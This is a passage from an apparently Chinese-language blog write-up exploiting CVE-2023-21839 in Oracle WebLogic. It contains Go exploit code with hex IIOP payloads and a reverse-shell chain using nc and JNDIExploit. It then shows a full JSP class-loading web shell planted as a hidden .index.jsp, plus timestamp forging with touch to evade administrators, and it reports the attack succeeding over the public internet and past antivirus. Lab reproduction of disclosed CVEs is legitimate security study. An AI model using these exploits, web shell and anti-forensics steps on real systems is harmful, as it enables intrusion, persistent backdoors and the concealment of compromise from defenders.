class="string">&quot;00424541080103000000000c41646d696e53657276657200000000000000003349&quot;</span> +</span><br><span class="line">			<span class="string">&quot;444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743&quot;</span> +</span><br><span class="line">			<span class="string">&quot;6f6e74657874416e793a312e3000000000000238000000000000014245412c0000001000&quot;</span> +</span><br><span class="line">			<span class="string">&quot;00000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class="line">		wlsKey2 = <span class="string">&quot;00424541080103000000000c41646d696e53657276657200000000000000003349&quot;</span> +</span><br><span class="line">			<span class="string">&quot;444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743&quot;</span> +</span><br><span class="line">			<span class="string">&quot;6f6e74657874416e793a312e30000000000004&#123;&#123;key3&#125;&#125;000000014245412c0000001000&quot;</span> +</span><br><span class="line">			<span class="string">&quot;00000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> ver == <span class="string">&quot;14&quot;</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;[*] weblogic 14&quot;</span>)</span><br><span class="line">		wlsKey1 = <span class="string">&quot;00424541080103000000000c41646&quot;</span> +</span><br><span class="line">			<span class="string">&quot;d696e53657276657200000000000000003349444c3a7765626c&quot;</span> +</span><br><span class="line">			<span class="string">&quot;6f6769632f636f7262612f636f732f6e616d696e672f4e616d6&quot;</span> +</span><br><span class="line">			<span class="string">&quot;96e67436f6e74657874416e793a312e30000000000002380000&quot;</span> +</span><br><span class="line">			<span class="string">&quot;00000000014245412e000000100000000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class="line">		wlsKey2 = <span class="string">&quot;00424541080103000000000c41646d696e53657276657&quot;</span> +</span><br><span class="line">			<span class="string">&quot;200000000000000003349444c3a7765626c6f6769632f636f72&quot;</span> +</span><br><span class="line">			<span class="string">&quot;62612f636f732f6e616d696e672f4e616d696e67436f6e74657&quot;</span> +</span><br><span class="line">			<span class="string">&quot;874416e793a312e30000000000004&#123;&#123;key3&#125;&#125;00000001424541&quot;</span> +</span><br><span class="line">			<span class="string">&quot;2e000000100000000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;[!] error and exit&quot;</span>)</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>





<hr>
<p>这个go脚本的使用很简单，先在攻击机<code>1369</code>端口打开ldap</p>
<p>先进行编译</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> build main.<span class="keyword">go</span> -<span class="keyword">o</span> web.<span class="keyword">exe</span></span><br></pre></td></tr></table></figure>

<p>然后攻击机上打开1369端口，挂上ldap</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20230302000014731.png"><img src="/CVE-Test/image-20230302000014731.png" alt="image-20230302000014731"></a></p>
<p>最后简单跑个计算器<code>（测试时间：2023/3/1，火绒未检测到，但是弹cmd还是会被警告的）</code></p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20230302000455096.png"><img src="/CVE-Test/image-20230302000455096.png" alt="image-20230302000455096"></a></p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20230302000412160.png"><img src="/CVE-Test/image-20230302000412160.png" alt="image-20230302000412160"></a></p>
<h4 id="公网测试"><a href="#公网测试" class="headerlink" title="公网测试"></a>公网测试</h4><p>太穷了，没有第二台电脑，在<code>aliyun</code>上搞了个<code>weblogic</code>，看看是否检测的到吗</p>
<p>这是公网环境下的</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20230302001529947.png"><img src="/CVE-Test/image-20230302001529947.png" alt="image-20230302001529947"></a></p>
<p>然后一样的测试如上，会被<code>windows defender</code>检测到，但是不会拦截，还是会一样执行命令</p>
<p>和朋友借了一下服务器测试，确实是可以实现公网测试的，而且<code>windows defender</code>并未拦截(公网测试时间:2023&#x2F;3&#x2F;2)</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20230302210930469.png"><img src="/CVE-Test/image-20230302210930469.png" alt="image-20230302210930469"></a></p>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>从官网下载<code>Weblogic 12.2.1.3.0</code></p>
<p><code>https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html</code></p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20230226141556869.png"><img src="/CVE-Test/image-20230226141556869.png" alt="image-20230226141556869"></a></p>
<h4 id="配置java环境"><a href="#配置java环境" class="headerlink" title="配置java环境"></a>配置java环境</h4><p>但是需要注意，由于<code>Weblogic</code>中的<code>maven</code>的存在，其识别<code>jdk</code>时，只针对环境变量名<code>JAVA_HOME</code>的路径进行识别，而如果是在<code>PATH</code>中配置的，会报错找不到<code>java</code>环境的位置</p>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ERROR: </span>Cannot determine the Java Home ERROR: Specify the -jreLoc option</span><br></pre></td></tr></table></figure>

<p>然后再次管理员执行时发现失败，查看报错日志</p>
<blockquote>
<p>java.lang.NullPointerException: Cannot invoke “java.lang.<strong><code>reflect.Method</code></strong>.invoke(Object, Object[])” because “com.sun.<code>xml.bind</code>.v2.runtime.reflect.opt.Injector.defineClass” <strong><code>is null</code></strong>[[</p>
</blockquote>
<p>猜测应该是我的<code>java</code>自身的问题</p>
<p>从<code>stack</code>中了解到了，在<code>java9</code>的时候，<code>JAXB</code>（Java Architecture for XML Binding）<code>[java映射为xml的表示方式]</code> </p>
<p>在<code>java9</code>已经被标记为弃用，在<code>java11</code>的时候已经被删除，所以需要换到低版本的<code>java</code>或者在依赖项添加<code>xml</code>库，让其重新映射</p>
<p><a target="_blank" rel="noopener" href="https://javaalmanac.io/jdk/11/apidiff/9/">New APIs in Java 11 - javaalmanac.io</a></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun.xml.bind<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jaxb-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun.xml.messaging.saaj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>saaj-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>【建议下载jdk8低版本最方便，记得再次修改<code>JAVA_HOME</code>环境变量】</p>
<blockquote>
<p>注意，这个和log4j的原因一样，是加载远程恶意类导致远程命令的执行，所以对java是否开启加载远程类，也就是要注意对应的版本</p>
<p>版本 ≤ <code>JDK 6u211、7u201、 8u191、11.0.1</code></p>
</blockquote>
<p>所以这里直接下载JDK-8u171</p>
<p><code>https://www.oracle.com/hk/java/technologies/javase/javase8-archive-downloads.html</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf jdk-8u171-linux-x64.tar.gz -C /usr/local/jdk/</span><br><span class="line"></span><br><span class="line"><span class="comment">#部署并修改环境变量</span></span><br><span class="line">sudo vi ~/.bashrc</span><br><span class="line"></span><br><span class="line"><span class="comment">#在文件末尾追加下面4行内容</span></span><br><span class="line"><span class="comment">#这里要注意目录要换成自己解压的jdk目录</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/local/jdk/jdk1.8.0_171 </span><br><span class="line"><span class="built_in">export</span> JRE_HOME=<span class="variable">$&#123;JAVA_HOME&#125;</span>/jre  </span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib  </span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#执行命令使得上面的环境变量成功</span></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line">sudo update-alternatives --install /usr/bin/java java /usr/local/jdk/jdk1.8.0_171/bin/java 300</span><br></pre></td></tr></table></figure>

<h5 id="查看版本-1"><a href="#查看版本-1" class="headerlink" title="查看版本"></a>查看版本</h5><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">version</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/2.png"><img src="/CVE-Test/2.png" alt="2"></a></p>
<h3 id="安装weblogic"><a href="#安装weblogic" class="headerlink" title="安装weblogic"></a>安装<code>weblogic</code></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar fmw_12.2.1.3.0_wls.jar </span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/1.png"><img src="/CVE-Test/1.png" alt="1"></a></p>
<p>安装目录名和weblogic所在用户组默认</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/4.png"><img src="/CVE-Test/4.png" alt="4"></a></p>
<p> 安装中</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/5.png"><img src="/CVE-Test/5.png" alt="5"></a></p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/6.png"><img src="/CVE-Test/6.png" alt="6"></a></p>
<p>用户名默认weblogic</p>
<p>密码为123456789</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/7.png"><img src="/CVE-Test/7.png" alt="7"></a></p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/8.png"><img src="/CVE-Test/8.png" alt="8"></a></p>
<h3 id="安装完成后，启动服务"><a href="#安装完成后，启动服务" class="headerlink" title="安装完成后，启动服务"></a>安装完成后，启动服务</h3><p>找到<code>/bin</code>启动服务脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&#x27;startWebLogic.sh&#x27;</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231130123224439.png"><img src="/CVE-Test/image-20231130123224439.png" alt="image-20231130123224439"></a></p>
<p>执行脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash /home/ttoc/Oracle/Middleware/Oracle_Home/user_projects/domains/base_domain/bin/startWebLogic.sh </span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231130123350919.png"><img src="/CVE-Test/image-20231130123350919.png" alt="image-20231130123350919"></a></p>
<p>成功访问</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231130123511391.png"><img src="/CVE-Test/image-20231130123511391.png" alt="image-20231130123511391"></a></p>
<h3 id="漏洞存在性测试"><a href="#漏洞存在性测试" class="headerlink" title="漏洞存在性测试"></a>漏洞存在性测试</h3><p>针对这种 T3 及 IIOP出现的漏洞，和log4j2一样，采用dnslog测试</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\CVE-<span class="number">2023</span>-<span class="number">21839</span>.exe -<span class="built_in">ip</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">169</span>.<span class="number">157</span> -port <span class="number">7001</span> -ldap ldap:<span class="comment">//nuu4hz.dnslog.cn</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/dnslog%E6%B5%8B%E8%AF%95.png"><img src="/CVE-Test/dnslog%E6%B5%8B%E8%AF%95.png" alt="dnslog测试"></a></p>
<p>发现有请求，说明可能存在漏洞</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/dnslog.png"><img src="/CVE-Test/dnslog.png" alt="dnslog"></a></p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><blockquote>
<p>靶机ubuntu20.04：192.168.169.157</p>
<p>攻击机kali 2023.2：192.168.169.130</p>
</blockquote>
<p>攻击机开启监听，准备反弹shell</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">8888</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231130225927419.png"><img src="/CVE-Test/image-20231130225927419.png" alt="image-20231130225927419"></a></p>
<p>然后使用JNDIExploit-1.3-SNAPSHOT.jar搭建ldap服务器</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231130231729924.png"><img src="/CVE-Test/image-20231130231729924.png" alt="image-20231130231729924"></a></p>
<p>用go工具向靶机weblogic服务发送反弹shell的命令</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231130224424739.png"><img src="/CVE-Test/image-20231130224424739.png" alt="image-20231130224424739"></a></p>
<p>但是执行后仍然遇到一点点问题，攻击机的JNDIExploit-1.3-SNAPSHOT.jar报错</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231130223814313.png"><img src="/CVE-Test/image-20231130223814313.png" alt="image-20231130223814313"></a></p>
<p>错误<code>java.lang.IllegalAccessError: superclass access check failed</code>通常发生在一个类试图访问另一个类中的某些元素，但是由于Java的访问控制，这个操作被禁止了。</p>
<p>在这种的情况下，<code>com.feihong.ldap.template.TomcatEchoTemplate</code>类试图访问<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>类，但是由于模块<code>java.xml</code>并没有将<code>com.sun.org.apache.xalan.internal.xsltc.runtime</code>导出给<code>com.feihong.ldap.template.TomcatEchoTemplate</code>所在的模块，所以访问失败了。</p>
<p>这个问题可能是由于Java的模块化系统引入的。</p>
<p>从Java 9开始，Java引入了模块系统，允许将类和接口组织到不同的模块中，并且可以控制模块之间的访问。</p>
<p>解决这个问题的一种方法是使用<code>--add-exports</code>选项来打开模块的访问权限。</p>
<p>所以只用修改一下命令即可命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED -jar JNDIExploit-1.3-SNAPSHOT.jar -i 192.168.169.130</span><br></pre></td></tr></table></figure>

<p>这个命令会将<code>java.xml</code>模块中的<code>com.sun.org.apache.xalan.internal.xsltc.runtime</code>包导出给所有未命名的模块。</p>
<p>再次执行，成功</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231130231601753.png"><img src="/CVE-Test/image-20231130231601753.png" alt="image-20231130231601753"></a></p>
<p>查看监听端口获取shell状态，成功获得靶机ubuntu的shell</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231130233109406.png"><img src="/CVE-Test/image-20231130233109406.png" alt="image-20231130233109406"></a></p>
<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>反弹获取的shell存在很多问题，由于是通过nc监听获取的一次会话，如果nc被退出，获取的shell也会跟着丢失，</p>
<p>所以需要将获取的shell从nc监听会话，转为正式的一个终端会话。</p>
<p>先ctrl z讲nc获取的shell会话置于后台运行，然后执行命令，</p>
<p>先重置stty，也就意味着你看不到输入的内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>  </span><br></pre></td></tr></table></figure>

<p>然后把后台挂起的nc获取的shell会话调回前台，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fg</span>  </span><br></pre></td></tr></table></figure>

<p>最后再次完全刷新终端屏幕，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reset  </span><br></pre></td></tr></table></figure>

<p>也可以合起来，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>;<span class="built_in">fg</span>;reset</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231130233218761.png"><img src="/CVE-Test/image-20231130233218761.png" alt="image-20231130233218761"></a></p>
<p>但是会发现虽然shell稳定了，但是显示错位了，这是stty的原因，当然也有部分kali和ubuntu之间终端显示底层的差异导致，可以用python自带的交互式shell处理，使得会话显示规整</p>
<p>直接启动python式交互</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231130233600459.png"><img src="/CVE-Test/image-20231130233600459.png" alt="image-20231130233600459"></a></p>
<p>可以看到调用后格式更规整，并且该交互shell还直接使用当前终端的高亮显示，也方便分清文件类型。</p>
<p>由于weblogic服务需要比较高的权限用户执行启动，所以反弹shell获取的会话权限也会很高，所以如果没有对执行weblogic服务器启动的用户自身的权限进行限制，就会十分危险。</p>
<p>但是为了维持权限稳定，可以写一个jsp一句话木马上去</p>
<p>根据官方文档，weblogic服务器的网站文件以及目录都在这个目录下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/ttoc/Oracle/Middleware/Oracle_Home/wlserver/server/lib/consoleapp/webapp</span><br></pre></td></tr></table></figure>

<p>查看这个目录下的状况，</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ll</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231130235701569.png"><img src="/CVE-Test/image-20231130235701569.png" alt="image-20231130235701569"></a></p>
<p>只需要找到一个web端可以非登录直接访问目录下文件的目录，写一个不死马，即可实现后门目的以来维持权限。</p>
<p>查看网页源码，发现&#x2F;console&#x2F;css可以在非登录状态下访问，并且该目录拥有执行权限，当然如果没有也可以凭借当前的root身份shell权限进行赋权，</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231130235335497.png"><img src="/CVE-Test/image-20231130235335497.png" alt="image-20231130235335497"></a></p>
<p>然后在<code>css</code>目录下创建一个jsp一句话木马文件，</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            <span class="built_in">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">cls</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;passwd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>再给<code>1.jsp</code>赋权</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 777 ./1.jsp</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201110707134.png"><img src="/CVE-Test/image-20231201110707134.png" alt="image-20231201110707134"></a></p>
<p>然后蚁剑尝试连接靶机的这个文件</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201000810938.png"><img src="/CVE-Test/image-20231201000810938.png" alt="image-20231201000810938"></a></p>
<p>访问发现连接成功，</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201001110687.png"><img src="/CVE-Test/image-20231201001110687.png" alt="image-20231201001110687"></a></p>
<p>但是直接在当前服务端生成一个文件太容易被检测到，所以最好的办法就是将jsp一句话木马写入已有的jsp文件中，</p>
<p>先找一下当前目录的jsp文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&quot;*.jsp&quot;</span> 2&gt; /dev/null</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201111621945.png"><img src="/CVE-Test/image-20231201111621945.png" alt="image-20231201111621945"></a></p>
<p>很快就会发现最后一个文件，</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/home/</span>ttoc<span class="regexp">/Oracle/</span>Middleware<span class="regexp">/Oracle_Home/</span>wlserver<span class="regexp">/server/</span>lib<span class="regexp">/consoleapp/</span>consolehelp/index.jsp</span><br></pre></td></tr></table></figure>

<p>做为index.jsp肯定可以被直接访问，而且在consolehelp路由下，所以是不需要登录访问的，于是将1.jsp内容附加到index.jsp的后面，然后删除1.jsp</p>
<p>先移动1.jsp到index.jsp所在目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> 1.jsp  /home/ttoc/Oracle/Middleware/Oracle_Home/wlserver/server/lib/consoleapp/consolehelp/</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201112427314.png"><img src="/CVE-Test/image-20231201112427314.png" alt="image-20231201112427314"></a></p>
<p>然后将内容追加到index.jsp中</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201112511153.png"><img src="/CVE-Test/image-20231201112511153.png" alt="image-20231201112511153"></a></p>
<p>然后删掉1.jsp并为index.jsp赋执行权限</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201113317976.png"><img src="/CVE-Test/image-20231201113317976.png" alt="image-20231201113317976"></a></p>
<p>但是访问index.jsp文件时，发现并没有变化，哪怕删掉也依旧正常访问，这是因为weblogic有两种模式，一种是开发者模式，一种是生产模式，默认是生产模式，该模式下，修改的文件不会被部署到服务器上，它有自己的一个部署目录，而生产模式才会将修改文件重新部署，所以于是我换了个思路。</p>
<p>只是为了防止管理员发现而已生成文件，那我们可以生成一个隐藏文件 .index.jsp，虽然生产模式不会部署修改文件，但是新建文件还是会进行部署，于是再生成一个.index.jsp文件并写入jsp一句话木马，并index.jsp就恢复原来代码以及权限状态。</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201115947536.png"><img src="/CVE-Test/image-20231201115947536.png" alt="image-20231201115947536"></a></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">chmod</span> <span class="number">640</span> index.jsp</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201120655450.png"><img src="/CVE-Test/image-20231201120655450.png" alt="image-20231201120655450"></a></p>
<p>再次尝试蚁剑连接，</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201120113628.png"><img src="/CVE-Test/image-20231201120113628.png" alt="image-20231201120113628"></a></p>
<p>连接成功，并且可以正常访问</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201120153540.png"><img src="/CVE-Test/image-20231201120153540.png" alt="image-20231201120153540"></a></p>
<h3 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h3><p>由于我们执行了大量命令，并且生成和修改了部分目录和文件，所以当管理员进行检测服务器最近更新情况就会很快发现该文件，所以需要删除命令执行日志，并修改文件，目录生成和修改时间和其他一样</p>
<h4 id="修改时间"><a href="#修改时间" class="headerlink" title="修改时间"></a>修改时间</h4><p>先修改.index.jsp所在目录下的，</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201120819297.png"><img src="/CVE-Test/image-20231201120819297.png" alt="image-20231201120819297"></a></p>
<p>发现主要就三个部分，当前目录修改时间，index.jsp和.index.jsp的修改时间，</p>
<p>痕迹清除最好和其他同属性文件时间一致，可以看到文件最后一次修改时间统一为</p>
<blockquote>
<p>Nov 23  2016 </p>
</blockquote>
<p>而目录修改时间统一为</p>
<blockquote>
<p>Nov 27 04:51</p>
</blockquote>
<p>于是执行命令</p>
<figure class="highlight irpf90"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">touch</span> -t <span class="number">201611230000</span> <span class="built_in">index</span>.jsp .<span class="built_in">index</span>.jsp</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201121316063.png"><img src="/CVE-Test/image-20231201121316063.png" alt="image-20231201121316063"></a></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">touch</span> -t <span class="number">11270451</span> ./</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201121529910.png"><img src="/CVE-Test/image-20231201121529910.png" alt="image-20231201121529910"></a></p>
<p>最后整体目录就正常了，时间也都正常了</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201121609229.png"><img src="/CVE-Test/image-20231201121609229.png" alt="image-20231201121609229"></a></p>
<p>然后是开始尝试的css目录</p>
